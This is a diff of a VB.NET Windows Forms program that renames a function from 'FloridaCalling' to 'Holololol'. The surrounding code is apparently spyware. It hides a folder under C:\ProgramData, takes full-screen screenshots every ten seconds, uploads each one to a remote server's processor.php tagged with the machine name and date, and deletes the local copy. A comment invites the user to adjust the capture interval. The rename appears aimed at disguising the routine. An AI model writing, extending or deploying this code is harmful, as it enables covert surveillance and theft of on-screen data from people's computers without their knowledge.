@@ -17,7 +17,7 @@ Public Class Form1
             Try
                 System.IO.Directory.CreateDirectory("C:\ProgramData\" & Environment.MachineName)
                 FileSystem.SetAttr(folder, FileAttribute.System + FileAttribute.Hidden)
-                FloridaCalling("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
+                Holololol("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
                 My.Computer.Network.UploadFile("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg", server & "processor.php?path=" & Environment.MachineName & "/" & todaysdate & "/")
                 IO.File.Delete("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
             Catch ex As Exception
@@ -25,7 +25,7 @@ Public Class Form1
             Thread.Sleep(10000) 'CHANGE THE LOOP SECONDS AS PER YOUR NEED'
         End While
     End Sub
-    Public Function FloridaCalling(ByVal path As String) As Boolean
+    Public Function Holololol(ByVal path As String) As Boolean
         Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
         Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
         Dim g As Graphics = Graphics.FromImage(screenGrab)
